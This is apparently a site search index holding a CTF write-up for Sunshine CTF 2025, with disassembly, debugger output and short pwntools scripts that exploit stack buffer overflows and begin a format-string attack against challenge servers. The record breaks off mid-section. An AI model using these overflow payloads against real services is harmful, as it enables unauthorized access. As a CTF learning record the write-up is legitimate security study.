{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"],"fields":{"title":{"boost":1000.0},"text":{"boost":1.0},"tags":{"boost":1000000.0}}},"docs":[{"location":"","title":"Writeups","text":"<p>Welcome to the Writeups section. Here you will find clean, simple pages for each CTF or project.</p> <ul> <li>Sunshine CTF Writeup</li> </ul>"},{"location":"about/","title":"About","text":"<p>I'm Ram \u2014 cybersecurity enthusiast and CTF player. This site hosts my writeups and projects.</p>"},{"location":"projects/","title":"Projects","text":"<ul> <li>pentesting tools</li> <li>rover-sim (CAN bus simulator)</li> </ul>"},{"location":"writeups/sunshine-ctf/","title":"Sunshine_CTF_writeup","text":"<p>This line marks the beginning of the writeup by BITSkrieg for the Sunshine CTF which was hosted by Hack@UCF in affiliation with BSides Orlando 2025. We participated in this prestigious tournament and placed 12th overall in the competition. Below will be a few writeups to be submitted by BITSkrieg:</p>"},{"location":"writeups/sunshine-ctf/#writeup-no1pegasus-can-you-hear-me","title":"Writeup No.1:(Pegasus) Can you hEAR me?","text":"<p>This one was pretty easy to do. The question stated:     A satellite has fallen from orbit, and miraculously, it is still operational. It appears to be running on a RAD-EAR-3 CPU, which is known for its reliability in space applications. The satellite has a handful of program cartridges that it can swap between (like a jukebox), and one of them is labeled \"hello\". Can you figure out how to run it? We need the satellite's serial number!</p> <p>You just had to run the peg file using runpeg directly and terminal just spits out the flag:</p> <p>$ ./runpeg CanYouHearMe.peg RAD-EAR-3 CPU initialized, running at 10MHz</p> <p>Board serial number: sun{d0_n0t_fEAR_th1s_c4t3g0ry};</p>"},{"location":"writeups/sunshine-ctf/#writeup-no2-pegasus-access-code","title":"Writeup No.2 :(Pegasus) Access Code","text":"<pre><code>This one a bit tricky to understand. The question stated:\nHere's the program cartridge for the satellite terminal's login system. We need the access code to start exploring the system.\n\n    AccessCode.peg\n</code></pre> <p>I had initially got a dbg prompt where I had to type forgot and got a hint hash encoded 64 bit string but it didn't take me anyway from there. So I had to start from scratch and first dissassemble the code and got this:</p> <p>'''bash     @puts:         0300.0000: MOV     A3, 0x7F         0304.0000: LDB     A1, [A0]         0306.0000: INC     A0, 1         0308.0000: AND     A2, A1, A3         030B.0000: WRB     (0), A2         030D.0000: CMP     A1, A2         030F.0000: BRR.NE  @puts+0x4 //0304.0000         0312.0000: RET @print_hex_byte:         0314.0000: ADD     A5, PC, 0x3A         0319.0000: SRU     A3, A0, 0x4         031D.0000: LDB     A4, [A5 + A3]         0320.0000: WRB     (0), A4         0322.0000: AND     A0, 0xF         0326.0000: LDB     A4, [A5 + A0]         0329.0000: WRB     (0), A4         032B.0000: RET @print_hex:         032D.0000: MOV     A1, A1         032F.0000: RET.EQ         0331.0000: ADD     A5, PC, 0x1D         0336.0000: LDB     A2, [A0]         0338.0000: SRU     A3, A2, 0x4         033C.0000: LDB     A4, [A5 + A3]         033F.0000: WRB     (0), A4         0341.0000: AND     A2, 0xF         0345.0000: LDB     A4, [A5 + A2]         0348.0000: WRB     (0), A4         034A.0000: INC     A0, 1         034C.0000: INC     A1, -1         034E.0000: BRR.NE  @print_hex+0x9 //0336.0000         0351.0000: RET         0353.0000: LDW.NE  A2, [A0]         0355.0000: LDB.NE  A2, [A2]         0357.0000: BRA.NE  A2, A4         0359.0000: FCA.NE  A2, S0         035B.0000: RDB.NE  A2, (9)         035D.0000: SUB.LE  A5, A1         035F.0000: MLS.LE  A5, A3         0361.0000: DVS.LE  A5, A5 @gimli_dump_state:         0363.0000: PSH     {S0-S1, FP, RA-RD}         0366.0000: INC     FP, SP, 4         0369.0000: MOV     S0, A0         036B.0000: WRB     (0), 0x20         036E.0000: WRB     (0), 0x20         0371.0000: MOV     S1, ZERO         0373.0000: MOV     S1, S1         0375.0000: BRR.EQ  @gimli_dump_state+0x31 //0394.0000         0378.0000: AND     ZERO, S1, 0xF         037D.0000: BRR.NE  @gimli_dump_state+0x29 //038C.0000         0380.0000: WRB     (0), 0xA         0383.0000: WRB     (0), 0x20         0386.0000: WRB     (0), 0x20         0389.0000: BRR     @gimli_dump_state+0x31 //0394.0000         038C.0000: AND     ZERO, S1, 0x3         0391.0000: WRB.EQ  (0), 0x20         0394.0000: LDB     A0, [S0 + S1]         0397.0000: FCR     @print_hex_byte         039A.0000: INC     S1, 1         039C.0000: CMP     S1, 0x30         03A0.0000: BRR.LT  @gimli_dump_state+0x10 //0373.0000         03A3.0000: WRB     (0), 0xA         03A6.0000: INC     SP, FP, -4         03A9.0000: POP     {S0-S1, FP, PC-DPC}         03AC.0000: SUB.GE  FP, A0         03AE.0000: SUB.GE  FP, A0         03B0.0000: SUB.GE  RA, S0         03B2.0000: SHL     PC, RD         03B4.0000: MOV     PC, S2         03B6.0000: SUB.GE  FP, A0         03B8.0000: SUB.GE  FP, A0         03BA.0000: SUB.GE  ZERO, FP @gimli:         03BC.0000: PSH     {S0-FP, RA-RD}         03BF.0000: MOV     A1, 0x18         03C3.0000: PSH     {A1}         03C6.0000: MOV     A2, ZERO         03C8.0000: POP     A0, {A3-A4}         03CC.0000: SHL     RA, A3, 0x8         03D0.0000: SHL     RD, A4, 0x8         03D4.0000: SRU     A3, 0x8         03D7.0000: ORR     A3, RD         03D9.0000: SRU     A4, 0x8         03DC.0000: ORR     A4, RA         03DE.0000: ADD     A0, 0xC         03E2.0000: POP     A0, {A5-S0}         03E6.0000: SRU     RA, A5, 0x7         03EA.0000: SRU     RD, S0, 0x7         03EE.0000: SHL     A5, 0x9         03F1.0000: ORR     A5, RD         03F3.0000: SHL     S0, 0x9         03F6.0000: ORR     S0, RA         03F8.0000: ADD     A0, 0xC         03FC.0000: POP     A0, {S1-S2}         0400.0000: AND     RA, A5, S1         0403.0000: AND     RD, S0, S2         0406.0000: SRU     A1, RA, 0xE         040A.0000: SHL     RA, 0x2         040D.0000: SHL     RD, 0x2         0410.0000: ORR     RD, A1         0412.0000: SHL     FP, S2, 0x1         0416.0000: SHL     A1, S1, 0x1         041A.0000: ORR.GE  FP, 0x1         041E.0000: XOR     RA, A1         0420.0000: XOR     RD, FP         0422.0000: XOR     RA, A3         0424.0000: XOR     RD, A4         0426.0000: PSH     A0, {RA-RD}         042A.0000: ORR     RA, A3, S1         042D.0000: ORR     RD, A4, S2         0430.0000: SHL     RD, 0x1         0433.0000: SHL     RA, 0x1         0436.0000: ORR.GE  RD, 0x1         043A.0000: XOR     RA, A3         043C.0000: XOR     RD, A4         043E.0000: XOR     RA, A5         0440.0000: XOR     RD, S0         0442.0000: SUB     A0, 0xC         0446.0000: PSH     A0, {RA-RD}         044A.0000: AND     RA, A3, A5         044D.0000: AND     RD, A4, S0         0450.0000: SRU     A1, RA, 0xD         0454.0000: SHL     RA, 0x3         0457.0000: SHL     RD, 0x3         045A.0000: ORR     RD, A1         045C.0000: XOR     RA, A5         045E.0000: XOR     RD, S0         0460.0000: XOR     RA, S1         0462.0000: XOR     RD, S2         0464.0000: SUB     A0, 0xC         0468.0000: PSH     A0, {RA-RD}         046C.0000: INC     A0, 4         046E.0000: INC     A2, 1         0470.0000: CMP     A2, 0x4         0474.0000: BRR.LT  @gimli+0xc //03C8.0000         0477.0000: SUB     A0, 0x10         047B.0000: POP     {A1}         047E.0000: SRU     A2, A1, 0x1         0482.0000: BRR.GE  @gimli+0x125 //04E1.0000         0485.0000: SRU     A2, 0x1         0488.0000: BRR.GE  @gimli+0xf9 //04B5.0000         048B.0000: POP     A0, {A3-S0}         048F.0000: PSH     A0, {A3-A4}         0493.0000: XOR     S0, 0x9E37         0497.0000: ORR     A3, A1, 0x7900         049C.0000: XOR     A5, A3         049E.0000: PSH     A0, {A5-S0}         04A2.0000: INC     A0, 8         04A4.0000: POP     A0, {A3-S0}         04A8.0000: PSH     A0, {A3-A4}         04AC.0000: PSH     A0, {A5-S0}         04B0.0000: INC     A0, -8         04B2.0000: BRR     @gimli+0x125 //04E1.0000         04B5.0000: POP     A0, {A3-A4}         04B9.0000: INC     A0, 4         04BB.0000: POP     A0, {A5-S0}         04BF.0000: PSH     A0, {A3-A4}         04C3.0000: INC     A0, -4         04C5.0000: PSH     A0, {A5-S0}         04C9.0000: INC     A0, 4         04CB.0000: POP     A0, {A3-A4}         04CF.0000: INC     A0, 4         04D1.0000: POP     A0, {A5-S0}         04D5.0000: PSH     A0, {A3-A4}         04D9.0000: INC     A0, -4         04DB.0000: PSH     A0, {A5-S0}         04DF.0000: INC     A0, -4         04E1.0000: INC     A1, -1         04E3.0000: BRR.NE  @gimli+0x7 //03C3.0000         04E6.0000: POP     {S0-FP, PC-DPC} @gimli_absorb_byte:         04E9.0000: LDW     A2, [A0 + 0x30]         04EE.0000: ADD     A2, A0         04F0.0000: LDB     A3, [A2]         04F2.0000: XOR     A3, A1         04F4.0000: STB     [A2],A3         04F6.0000: RET @gimli_squeeze_byte:         04F8.0000: LDW     A1, [A0 + 0x30]         04FD.0000: ADD     A0, A1         04FF.0000: LDB     A0, [A0]         0501.0000: RET @gimli_advance:         0503.0000: ADD     A1, A0, 0x30         0508.0000: LDW     A2, [A1]         050A.0000: INC     A2, 1         050C.0000: STW     [A1],A2         050E.0000: CMP     A2, 0x10         0512.0000: RET.NE         0514.0000: PSH     {A1, RA-RD}         0517.0000: FCR     @gimli         051A.0000: POP     {A1}         051D.0000: STW     [A1],ZERO         051F.0000: POP     {PC-DPC} @gimli_absorb:         0522.0000: MOV     A2, A2         0524.0000: RET.EQ         0526.0000: PSH     {S0-FP, RA-RD}         0529.0000: INC     FP, SP, 6         052C.0000: MOV     S0, A0         052E.0000: MOV     S1, A1         0530.0000: MOV     S2, A2         0532.0000: LDB     A1, [S1]         0534.0000: INC     S1, 1         0536.0000: MOV     A0, S0         0538.0000: FCR     @gimli_absorb_byte         053B.0000: MOV     A0, S0         053D.0000: FCR     @gimli_advance         0540.0000: INC     S2, -1         0542.0000: BRR.NE  @gimli_hash_update+0x10 //0532.0000         0545.0000: INC     SP, FP, -6         0548.0000: POP     {S0-FP, PC-DPC} @gimli_squeeze:         054B.0000: MOV     A2, A2         054D.0000: RET.EQ         054F.0000: PSH     {S0-FP, RA-RD}         0552.0000: INC     FP, SP, 6         0555.0000: MOV     S0, A0         0557.0000: MOV     S1, A1         0559.0000: MOV     S2, A2         055B.0000: ADD     A0, 0x30         055F.0000: MOV     A1, 0xF         0563.0000: STW     [A0],A1         0565.0000: MOV     A0, S0         0567.0000: FCR     @gimli_advance         056A.0000: MOV     A0, S0         056C.0000: FCR     @gimli_squeeze_byte         056F.0000: STB     [S1],A0         0571.0000: INC     S1, 1         0573.0000: INC     S2, -1         0575.0000: BRR.NE  @gimli_squeeze+0x1a //0565.0000         0578.0000: INC     SP, FP, -6         057B.0000: POP     {S0-FP, PC-DPC} @gimli_pad:         057E.0000: PSH     {A0, FP, RA-RD}         0581.0000: INC     FP, SP, 2         0584.0000: MOV     A1, 0x1         0588.0000: FCR     @gimli_absorb_byte         058B.0000: POP     {A0}         058E.0000: ADD     A0, 0x2F         0592.0000: LDB     A1, [A0]         0594.0000: XOR     A1, 0x1         0598.0000: STB     [A0],A1         059A.0000: MOV     SP, FP         059C.0000: POP     {FP, PC-DPC} @gimli_hash_init:         059F.0000: MOV     A1, ZERO         05A1.0000: MOV     A2, ZERO         05A3.0000: MOV     A3, ZERO         05A5.0000: ADD     A0, 0x30         05A9.0000: STW     [A0],ZERO         05AB.0000: PSH     A0, {ZERO, A1-A3}         05AF.0000: PSH     A0, {ZERO, A1-A3}         05B3.0000: PSH     A0, {ZERO, A1-A3}         05B7.0000: PSH     A0, {ZERO, A1-A3}         05BB.0000: PSH     A0, {ZERO, A1-A3}         05BF.0000: PSH     A0, {ZERO, A1-A3}         05C3.0000: RET @gimli_hash_final:         05C5.0000: PSH     {A0-A2, FP, RA-RD}         05C8.0000: INC     FP, SP, 6         05CB.0000: FCR     @gimli_pad         05CE.0000: POP     {A0-A2}         05D1.0000: FCR     @gimli_squeeze         05D4.0000: POP     {FP, PC-DPC} @gimli_hash:         05D7.0000: PSH     {A0-A3, FP, RA-RD}         05DA.0000: INC     FP, SP, 8         05DD.0000: SUB     SP, 0x32         05E1.0000: MOV     A0, SP         05E3.0000: FCR     @gimli_hash_init         05E6.0000: ADD     A5, SP, 0x36         05EB.0000: POP     A5, {A1-A2}         05EF.0000: MOV     A0, SP         05F1.0000: FCR     @gimli_absorb         05F4.0000: ADD     A5, SP, 0x32         05F9.0000: POP     A5, {A1-A2}         05FD.0000: MOV     A0, SP         05FF.0000: FCR     @gimli_hash_final         0602.0000: MOV     SP, FP         0604.0000: POP     {FP, PC-DPC} @memcmp8:         0607.0000: MOV     A3, A0         0609.0000: LDB     A4, [A3]         060B.0000: LDB     A5, [A1]         060D.0000: SUB     A0, A4, A5         0610.0000: RET.NE         0612.0000: INC     A3, 1         0614.0000: INC     A1, 1         0616.0000: INC     A2, -1         0618.0000: BRR.NE  @memcmp8+0x2 //0609.0000         061B.0000: RET @memcmp16:         061D.0000: MOV     A3, A0         061F.0000: LDW     A4, [A3]         0621.0000: LDW     A5, [A1]         0623.0000: SUB     A0, A4, A5         0626.0000: RET.NE         0628.0000: INC     A3, 2         062A.0000: INC     A1, 2         062C.0000: INC     A2, -2         062E.0000: BRR.NE  @memcmp16+0x2 //061F.0000         0631.0000: RET @memcmp:         0633.0000: MOV     A2, A2         0635.0000: MOV.EQ  A0, ZERO         0637.0000: RET.EQ         0639.0000: MOV     A3, A0         063B.0000: AND     A4, A3, 0x1         0640.0000: AND     A5, A1, 0x1         0645.0000: XOR     A4, A5         0647.0000: BRR.NE  @memcmp8+0x2 //0609.0000         064A.0000: MOV     A4, A4         064C.0000: BRR.EQ  @memcmp+0x2d //0660.0000         064F.0000: LDB     A4, [A3]         0651.0000: LDB     A5, [A1]         0653.0000: SUB     A0, A4, A5         0656.0000: RET.NE         0658.0000: INC     A3, 1         065A.0000: INC     A1, 1         065C.0000: INC     A2, -1         065E.0000: RET.EQ         0660.0000: PSH     {RA-RD}         0663.0000: FCR     @memcmp16+0x2 //061F.0000         0666.0000: MOV     A0, A0         0668.0000: POP.NE  {PC-DPC}         066B.0000: AND     ZERO, A2, 0x1         0670.0000: POP.EQ  {PC-DPC}         0673.0000: INC     A2, -1         0675.0000: LDB     A4, [A3 + A2]         0678.0000: LDB     A5, [A1 + A2]         067B.0000: SUB     A0, A4, A5         067E.0000: POP     {PC-DPC}</p> <p>@read_line:         0681.0000: MOV     A2, A0         0683.0000: MOV     A0, ZERO         0685.0000: BRR     @read_line+0x13 //0694.0000         0688.0000: INC     A0, 1         068A.0000: STB     [A2],A3         068C.0000: INC     A2, 1         068E.0000: CMP     A3, 0xA         0692.0000: RET.EQ         0694.0000: CMP     A0, A1         0696.0000: RET.GE         0698.0000: RDB     A3, (0)         069A.0000: BRR.LT  @read_line+0x7 //0688.0000         069D.0000: XOR     A0, 0xFFFF         06A1.0000: RET</p> <pre><code>    06A3.0000: PSH     {A1, FP, RA-RD}\n    06A6.0000: INC     FP, SP, 2\n    06A9.0000: MOV     A1, 0x20\n    06AD.0000: MOV     A2, SP\n    06AF.0000: MOV     A3, 0x2\n    06B3.0000: FCR     @gimli_hash\n    06B6.0000: MOV     SP, FP\n    06B8.0000: POP     {FP, PC-DPC}\n</code></pre> <p>@some_func2:         06BB.0000: PSH     {FP, RA-RD}         06BE.0000: MOV     FP, SP         06C0.0000: MOV     A1, 0x6874         06C4.0000: MOV     A2, 0x5F33         06C8.0000: PSH     {A1-A2}         06CB.0000: ADD     A0, PC, 0x330         06D0.0000: MOV     A1, SP         06D2.0000: MOV     A2, 0x4         06D6.0000: FCR     @gimli_absorb         06D9.0000: MOV     SP, FP         06DB.0000: POP     {FP, PC-DPC}</p> <p>@some_func1:         06DE.0000: PSH     {S0-S1, FP, RA-RD}         06E1.0000: INC     FP, SP, 4         06E4.0000: ADD     S0, PC, 0x317         06E9.0000: MOV     A0, S0         06EB.0000: FCR     @gimli_hash_init         06EE.0000: MOV     A0, S0         06F0.0000: MOV     A2, 0x7B6E         06F4.0000: MOV     A1, 0x7573         06F8.0000: PSH     {A1-A2}         06FB.0000: MOV     A1, SP         06FD.0000: MOV     A2, 0x4         0701.0000: FCR     @gimli_absorb         0704.0000: INC     SP, 4         0706.0000: FCR     @read_line+0x3a //06BB.0000         0709.0000: MOV     A0, S0         070B.0000: ADD     A1, PC, 0x235         0710.0000: MOV     A2, 0x5         0714.0000: FCR     @gimli_absorb         0717.0000: ADD     S1, PC, 0x338         071C.0000: LDB     A1, [S1]         071E.0000: SHL     A1, 0x9         0721.0000: BRR.LT  @read_line+0xb3 //0734.0000         0724.0000: SRU     A1, 0x9         0727.0000: INC     S1, 1         0729.0000: MOV     A0, S0         072B.0000: FCR     @gimli_absorb_byte         072E.0000: FCR     @gimli_advance         0731.0000: BRR     @read_line+0x9b //071C.0000         0734.0000: RDC     A3, INSN_COUNT_LO         0736.0000: RDC     A4, INSN_COUNT_HI         0738.0000: ADD     A3, 0x280F         073C.0000: ADD     A4, 0x7D52         0740.0000: PSH     {A3-A4}         0743.0000: MOV     A0, S0         0745.0000: MOV     A1, SP         0747.0000: MOV     A2, 0x4         074B.0000: FCR     @gimli_absorb         074E.0000: INC     SP, 4         0750.0000: MOV     A0, S0         0752.0000: ADD     A1, PC, 0x2DC         0757.0000: MOV     A2, 0x20         075B.0000: FCR     @gimli_hash_final         075E.0000: INC     SP, FP, -4         0761.0000: POP     {S0-S1, FP, PC-DPC} @main:         0764.0000: PSH     {S0, FP, RA-RD}         0767.0000: INC     FP, SP, 2         076A.0000: SUB     SP, 0x52         076E.0000: FCR     @read_line+0x5d //06DE.0000         0771.0000: MOV     S0, ZERO         0773.0000: ADD     A0, PC, 0x188         0778.0000: FCR     @puts         077B.0000: MOV     A0, SP         077D.0000: MOV     A1, 0x32         0781.0000: FCR     @read_line         0784.0000: INC     A0, -1         0786.0000: WRB.NG  (0), 0xA         078A.0000: MOV.NG  A0, 0x1         078F.0000: FCR.NG  0xFF00         0793.0000: CMP     A0, 0x6         0797.0000: BRR.NE  @main+0x68 //07CC.0000         079A.0000: MOV     A1, SP         079C.0000: POP     A1, {A2-A4}         07A0.0000: CMP     A2, 0x6F66         07A4.0000: CMP.EQ  A3, 0x6772         07A8.0000: CMP.EQ  A4, 0x746F         07AC.0000: BRR.NE  @main+0x68 //07CC.0000         07AF.0000: ADD     A0, PC, 0x1D4         07B4.0000: FCR     @puts         07B7.0000: ADD     A0, PC, 0x277         07BC.0000: MOV     A1, 0x20         07C0.0000: FCR     @print_hex         07C3.0000: WRB     (0), 0x22         07C6.0000: WRB     (0), 0xA         07C9.0000: BRR     @main+0xf //0773.0000         07CC.0000: MOV     A3, A0         07CE.0000: SUB     A0, FP, 0x22         07D3.0000: MOV     A1, 0x20         07D7.0000: MOV     A2, SP         07D9.0000: FCR     @gimli_hash         07DC.0000: SUB     A0, FP, 0x22         07E1.0000: ADD     A1, PC, 0x24D         07E6.0000: MOV     A2, 0x20         07EA.0000: FCR     @memcmp         07ED.0000: CMP     A0, ZERO         07EF.0000: BRR.NE  @main+0x99 //07FD.0000         07F2.0000: ADD     A0, PC, 0x1AC         07F7.0000: FCR     @puts         07FA.0000: BRR     @main+0xb5 //0819.0000         07FD.0000: ADD     A0, PC, 0x11C         0802.0000: FCR     @puts         0805.0000: INC     S0, 1         0807.0000: CMP     S0, 0x3         080B.0000: BRR.LT  @main+0xf //0773.0000         080E.0000: ADD     A0, PC, 0x137         0813.0000: FCR     @puts         0816.0000: BRR     @main+0xf //0773.0000         0819.0000: MOV     A0, ZERO         081B.0000: INC     SP, FP, -2         081E.0000: POP     {S0, FP, PC-DPC}         0821.0000: STW     [FP],FP         0823.0000: BRR     @main</p> <p>If we observe closely there is a hash function named ghimli which actually tells a lot about the latter part of challenge.  The process is implemented in @gimli_hash and has the follwing:</p> <pre><code>    1. call @gimli_hash_init\n    2. call @gimli_absorb\n    3. call @gimli_hash_final\n</code></pre> <p>After calling the above three functions it supposedly takes hash of some data we dont know and is trying to compare it with the user inputs I am entering. So after a lot of time and trial and error I tried using the debugger once agian to find A1 parameter of @gimli_absorb_byte.(Earlier it was missing out the bytes of @gimli_absorb_byte so had to do this step) It printed out something like this:</p> <pre><code>'''bash\n    $ ./runpeg --debug AccessCode.peg\n\n    EAR debugger\n    (dbg) b 04e9\n    Created breakpoint #1 at address 04E9 (X)\n    (dbg) c\n    HW breakpoint #1 hit trying to execute 1 byte at 04E9\n    A breakpoint was hit\n\n    Thread state:\n    (ZERO)R0: 0000      (S1)R8: FD97\n        (A0)R1: 0A00      (S2)R9: 0004\n        (A1)R2: 0073     (FP)R10: FD90\n        (A2)R3: 0004     (SP)R11: FD8A\n        (A3)R4: 0000     (RA)R12: 053B\n        (A4)R5: 0000     (RD)R13: 0000\n        (A5)R6: EA23     (PC)R14: 04E9 //@gimli_absorb_byte+0\n        (S0)R7: 0A00    (DPC)R15: 0000\n    FLAGS: zspcvXr\n\n    Next instructions:\n    @gimli_absorb_byte:\n            04E9.0000: LDW     A2, [A0 + 0x30]\n            04EE.0000: ADD     A2, A0\n            04F0.0000: LDB     A3, [A2]\n            04F2.0000: XOR     A3, A1\n            04F4.0000: STB     [A2],A3\n    (dbg) c\n    HW breakpoint #1 hit trying to execute 1 byte at 04E9\n    A breakpoint was hit\n\n    Thread state:\n    (ZERO)R0: 0000      (S1)R8: FD98\n        (A0)R1: 0A00      (S2)R9: 0003\n        (A1)R2: 0075     (FP)R10: FD90\n        (A2)R3: 0001     (SP)R11: FD8A\n        (A3)R4: 0073     (RA)R12: 053B\n        (A4)R5: 0000     (RD)R13: 0000\n        (A5)R6: EA23     (PC)R14: 04E9 //@gimli_absorb_byte+0\n        (S0)R7: 0A00    (DPC)R15: 0000\n    FLAGS: zspcvXr\n\n    Next instructions:\n    @gimli_absorb_byte:\n            04E9.0000: LDW     A2, [A0 + 0x30]\n            04EE.0000: ADD     A2, A0\n            04F0.0000: LDB     A3, [A2]\n            04F2.0000: XOR     A3, A1\n            04F4.0000: STB     [A2],A3\n    (dbg) c\n    HW breakpoint #1 hit trying to execute 1 byte at 04E9\n    A breakpoint was hit\n\n    Thread state:\n    (ZERO)R0: 0000      (S1)R8: FD99\n        (A0)R1: 0A00      (S2)R9: 0002\n        (A1)R2: 006E     (FP)R10: FD90\n        (A2)R3: 0002     (SP)R11: FD8A\n        (A3)R4: 0075     (RA)R12: 053B\n        (A4)R5: 0000     (RD)R13: 0000\n        (A5)R6: EA23     (PC)R14: 04E9 //@gimli_absorb_byte+0\n        (S0)R7: 0A00    (DPC)R15: 0000\n    FLAGS: zspcvXr\n\n    Next instructions:\n    @gimli_absorb_byte:\n            04E9.0000: LDW     A2, [A0 + 0x30]\n            04EE.0000: ADD     A2, A0\n            04F0.0000: LDB     A3, [A2]\n            04F2.0000: XOR     A3, A1\n            04F4.0000: STB     [A2],A3\n</code></pre> <p>After joining and reconstruction of the flag by using things like:      ```python</p> <pre><code>&gt;&gt;&gt; bytes.fromhex(\"73756e\")\nb'sun'\n</code></pre> <p>We get the flag sun{th3_fun_p4r7_15_nEAR}     ```.</p>"},{"location":"writeups/sunshine-ctf/#writeup-no3pegasuslogin-screen","title":"Writeup No.3:(Pegasus)Login Screen","text":"<p>This one was easier than the erlier Access code challenge and it didn't have the flag scattered all roung the memory and encoded or something. The question was:         After entering the access code, you're now presented with the satellite terminal's login prompt. We don't know the correct login details, can you find a way around it?</p> <pre><code>        LoginScreen.peg\n        runpeg (updated)\n\n    Note: There is a new build of runpeg available which now has a --flag-port-file option. Create a dummy flag.txt file and then run it like this:\n\n    runpeg LoginScreen.peg --flag-port-file flag.txt\n\n    This sets up the file whose contents are read when the EAR code runs the RDB instruction to read from port 0xF ('f' for flag, get it?). The way this works is that each time you execute RDB &lt;reg&gt;, (0xF), the next flag byte is read into &lt;reg&gt;. When there are no more flag bytes left to read, CF will be set.\n    nc sunshinectf.games 25701\n</code></pre> <p>For the first time in my life I liked a challenge since it was fun to solve it! I started by debugging and dissassembling the code:</p> <pre><code>    @puts:\n            0200.0000: MOV     A3, 0x7F\n            0204.0000: LDB     A1, [A0]\n            0206.0000: INC     A0, 1\n            0208.0000: AND     A2, A1, A3\n            020B.0000: WRB     (0), A2\n            020D.0000: CMP     A1, A2\n            020F.0000: BRR.NE  @puts+0x4 //0204.0000\n            0212.0000: RET\n    @read_line:\n            0214.0000: MOV     A2, A0\n            0216.0000: MOV     A0, ZERO\n            0218.0000: BRR     @read_line+0x13 //0227.0000\n            021B.0000: INC     A0, 1\n            021D.0000: STB     [A2],A3\n            021F.0000: INC     A2, 1\n            0221.0000: CMP     A3, 0xA\n            0225.0000: RET.EQ\n            0227.0000: CMP     A0, A1\n            0229.0000: RET.GE\n            022B.0000: RDB     A3, (0)\n            022D.0000: BRR.LT  @read_line+0x7 //021B.0000\n            0230.0000: XOR     A0, 0xFFFF\n            0234.0000: RET\n    @win:\n            0236.0000: RDB     A0, (15)\n            0238.0000: BRR.GE  @win+0xa //0240.0000\n            023B.0000: WRB     (0), A0\n            023D.0000: BRR     @win\n            0240.0000: MOV     A0, ZERO\n            0242.0000: FCR     0xFF00\n    @main:\n            0245.0000: PSH     {S0, FP, RA-RD}\n            0248.0000: INC     FP, SP, 2\n            024B.0000: ADD     A0, PC, 0xB0\n            0250.0000: FCR     @puts\n            0253.0000: ADD     A0, PC, 0x1BC\n            0258.0000: FCR     @puts\n            025B.0000: SUB     SP, 0x32\n            025F.0000: MOV     A0, SP\n            0261.0000: MOV     A1, 0x64\n            0265.0000: FCR     @read_line\n            0268.0000: MOV     S0, A0\n            026A.0000: INC     S0, -1\n            026C.0000: ADD     A0, PC, 0x1B3\n            0271.0000: FCR     @puts\n            0274.0000: MOV     A0, SP\n            0276.0000: ADD     A1, A0, S0\n            0279.0000: CMP     A0, A1\n            027B.0000: BRR.GE  @main+0x42 //0287.0000\n            027E.0000: LDB     A2, [A0]\n            0280.0000: INC     A0, 1\n            0282.0000: WRB     (0), A2\n            0284.0000: BRR     @main+0x34 //0279.0000\n            0287.0000: WRB     (0), 0x21\n            028A.0000: WRB     (0), 0xA\n            028D.0000: MOV     A0, ZERO\n            028F.0000: INC     SP, FP, -2\n            0292.0000: POP     {S0, FP, PC-DPC}\n            0295.0000: STW     [FP],FP\n            0297.0000: BRR     @main\n</code></pre> <p>It was clear from here that stack overflow is happening at @read_line .We can use buffer overflow to change PC to point to @win function when 0292.0000: POP {S0, FP, PC-DPC} is running to extract the flag out!</p> <p>Using the basic pwn tools and a bit of coding to print the flag:</p> <pre><code>    ```python\n    p = remote(\"sunshinectf.games\", 25701)\n    p.recvuntil(b\"Enter username:\")\n    # S0=0x4141, FP=0x4141, PC=0x0236, DPC=0\n    p.sendline(b\"A\" * 0x37 + p16(0x0236) + p16(0x0))\n    p.interactive()\n  ```\n</code></pre> <p>And just like that the flag was extracted: sun{th1s_i5_ju57_7h3_t1p_0f_7h3_spEAR}    </p>"},{"location":"writeups/sunshine-ctf/#writeup-no4-i95-miami","title":"Writeup No.4 :(i95) Miami","text":"<p>Even this was an easy one. The question stated:</p> <pre><code>    Dexter is the prime suspect of being the Bay Harbor Butcher, we break into his login terminal and get the proof we need!\n\n        miami\n\n    nc chal.sunshinectf.games 25601\n</code></pre> <p>Decompiled the code in Ghidra and we get:         int vuln()         {         _QWORD v1[8]; // [rsp+0h] [rbp-50h] BYREF         int v2; // [rsp+40h] [rbp-10h]         int v3; // [rsp+4Ch] [rbp-4h]</p> <pre><code>    v3 = 0xDEADBEEF;\n    memset(v1, 0, sizeof(v1));\n    v2 = 0;\n    printf(\"Enter Dexter's password: \");\n    gets(v1);\n    if ( v3 != 0x1337C0DE )\n        return puts(\"Invalid credentials!\");\n    puts(\"Access granted...\");\n    return read_flag();\n    }\n</code></pre> <p>Stack overflow using gets. We can override the memory location 0x1337C0DE by writing a simple python code and pwn tools:</p> <pre><code>    from pwn import *\n\n    elf = ELF(\"./miami\")\n    context.binary = elf\n    context.terminal = [\"tmux\", \"split-w\", \"-h\"]\n    context(arch=\"amd64\", os=\"linux\", log_level=\"debug\")\n\n    p = remote(\"chal.sunshinectf.games\", 25601)\n    # runs \"./miami\"\n    # gdb.attach(p)\n    # pause()\n    p.sendline(b\"A\"*76+p32(0x1337c0de))\n    p.interactive()\n</code></pre> <p>Flag outputed: sun{DeXtEr_was_!nnocent_Do4kEs_w4s_the_bAy_hRrb0ur_bu7cher_afterall!!}</p>"},{"location":"writeups/sunshine-ctf/#writeup-no5-i95jupiter","title":"Writeup No.5 :(i95)Jupiter","text":"<p>This was a fun one. Had to first learn how to shift memory and then write the code on shifting of memory. First I debugged the code using Ghidra:</p> <pre><code>    int __fastcall main(int argc, const char **argv, const char **envp)\n    {\n    _QWORD buf[12]; // [rsp+0h] [rbp-60h] BYREF\n\n    buf[11] = __readfsqword(0x28u);\n    memset(buf, 0, 88);\n    printf(\"Welcome to Jupiter's echo terminal\\nEnter data at your own risk: \");\n    read(0, buf, 0x57u);\n    dprintf(2, (const char *)buf);\n    if ( secret_key == 0x1337C0DE )\n        read_flag();\n    return 0;\n    }\n</code></pre> <p>The code wants the flag's meomery at 0x1337C0DE and only then will it print the flag. Now we have to find the secret key and get the memory location of the key.</p> <pre><code>    .data:0000000000404010                 public secret_key\n    .data:0000000000404010 secret_key      dd 0BADC0DEh            ; DATA XREF: main+B3\u2191r\n    .data:0000000000404010 _data           ends\n    .data:0000000000404010\n</code></pre> <p>The key is located at 0x404010 with inital value of 0x0BADC0DE So the problem remains that instead of 0x1337C0DE we need to place 0x404012 which is 2 bytes higher than the key. Then I was trying to figure out the format string placement on the stack memory. After trying out a few exploitations I reached printf exploitation:         $ ./jupiter         Welcome to Jupiter's echo terminal         Enter data at your 